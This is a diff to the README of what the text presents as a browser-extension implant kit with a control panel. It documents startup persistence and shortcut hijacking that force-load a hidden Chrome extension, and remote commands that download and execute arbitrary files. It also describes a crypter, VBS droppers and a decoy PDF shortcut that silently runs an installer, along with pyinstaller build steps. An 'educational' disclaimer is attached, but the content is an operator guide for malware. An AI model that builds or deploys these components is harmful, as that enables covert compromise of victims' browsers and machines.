@@ -14,8 +14,6 @@
 4. **scrypt** – additional utilities  
 5. **server** – server + web panel that control the extension  
 
-> *Each directory above has its own `README.md` describing the internals.*
-
 ---
 
 ## Extension Server (server/)
@@ -61,10 +59,10 @@ Change the panels login/password stored in configpass.json.
 
 ### Installer Commands
 
-* `restart_chrome` — Restart Chrome on the victim
-* `update_extension` — Load a new extension, remove the old one
-* `delete` — Remove itself and all temp data completely
-* `load_and_run` — Download any file and execute it
+* restart_chrome — Restart Chrome on the victim
+* update_extension — Load a new extension, remove the old one
+* delete — Remove itself and all temp data completely
+* load_and_run — Download any file and execute it
 
 ### Auth Credentials
 
@@ -77,7 +75,7 @@ password: admin
 
 | Section           | Features                                                                                                               |
 | ----------------- | ---------------------------------------------------------------------------------------------------------------------- |
-| **Home**          | Filter *Online / Offline*, search by Device ID <br>Send commands to a specific device<br>View device list & history |
+| **Home**          | Filter Online / Offline, search by Device ID <br>Send commands to a specific device<br>View device list & history |
 | **Configuration** | Edit Url Lock / Url Unlock for Xlock page                                                                      |
 
 ---
@@ -85,7 +83,7 @@ password: admin
 ## 🪟 Build Windows – loadWin x64
 
 * Uses winshell, shutil
-* Creates autorun shortcut in *Startup*
+* Creates autorun shortcut in Startup
 * Restarts Chrome via .bat
 * Recursively finds every Chrome shortcut and overwrites it
 * Works with temp files in %TEMP%
@@ -102,7 +100,7 @@ pip install pyinstaller
 pyinstaller --onefile --add-data "extension;extension" loadwin.py
 ```
 
-* `--add-data "extension;extension"` embeds the extension directory.
+* --add-data "extension;extension" embeds the extension directory.
 * Output: dist/loadwin.exe
 * Install all dependencies first
 
@@ -110,30 +108,30 @@ pyinstaller --onefile --add-data "extension;extension" loadwin.py
 
 | Script         | Purpose                                                                |
 | -------------- | ---------------------------------------------------------------------- |
-| `loadwin.py`   | Full version: installs in system, loads extension, awaits all commands |
-| `loader.py`    | Installs extension only and handles `restart_chrome`               |
-| `load.py`      | Same as loadwin.py except no persistence on disk                   |
-| *Sample build* | See scrypt/exe/                                                      |
+| loadwin.py   | Full version: installs in system, loads extension, awaits all commands |
+| loader.py    | Installs extension only and handles restart_chrome               |
+| load.py      | Same as loadwin.py except no persistence on disk                   |
+| Sample build | See scrypt/exe/                                                      |
 
-> **Requires admin rights** for stability – runs, but unreliably, without them.
+> Requires admin rights for stability – runs, but unreliably, without them.
 
 ### Runtime Functionality
 
-1. **First run:** copies extension to %APPDATA%\.hidden_extension\extension if absent.
+1. First run: copies extension to %APPDATA%\.hidden_extension\extension if absent.
 2. Adds shortcut to Startup %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup.
 3. Locates every Chrome.lnk and adds --load-extension="…" to the target.
 4. Kills all Chrome processes, waits 3 min, re-launches Chrome via temp .bat.
 5. Polls the server every 30 s for commands:
 
-   * `restart_chrome` — update shortcuts & restart
-   * `load_and_run` — download `.exe` to temp & run
-   * `update_extension` — download `.zip`, replace extension, restart
-   * `delete` — remove extension, autostart shortcut, and the agent itself
-6. `delete` also kills Chrome and wipes the hidden extension folder.
+   * restart_chrome — update shortcuts & restart
+   * load_and_run — download exe to temp & run
+   * update_extension — download zip, replace extension, restart
+   * delete — remove extension, autostart shortcut, and the agent itself
+6. delete also kills Chrome and wipes the hidden extension folder.
 
 ---
 
-## Quick Start (LoaderPanel)
+## Quick Start - Loader Panel
 
 ```
 Init Node project
@@ -163,16 +161,16 @@ Uses MongoDB – recommended GUI: MongoDB Compass.
 | Folder      | Description                                                                |
 | ----------- | -------------------------------------------------------------------------- |
 | `Cvbs`      | VBS mods that download & run install.vbs on various Windows versions     |
-| `DropDemo`  | Demo crypter for `load.exe`                                                |
+| `DropDemo`  | Demo crypter for load.exe                                                |
 | `exe`       | Pre-built load.exe Python + extension packed                           |
-| `lnk`       | Auto-creates a shortcut that opens a PDF *and* runs install.vbs silently |
+| `lnk`       | Auto-creates a shortcut that opens a PDF and runs install.vbs silently |
 | `loadermac` | macOS installer demo, WIP, requires admin password                       |
 
 ---
 
 ## Disclaimer
 
-> This repository is provided for **educational purposes only** and intended for **authorized security research**.
+> This repository is provided for educational purposes only and intended for authorized security research.
 > **Unauthorized or illegal use is strictly prohibited.**
 
 
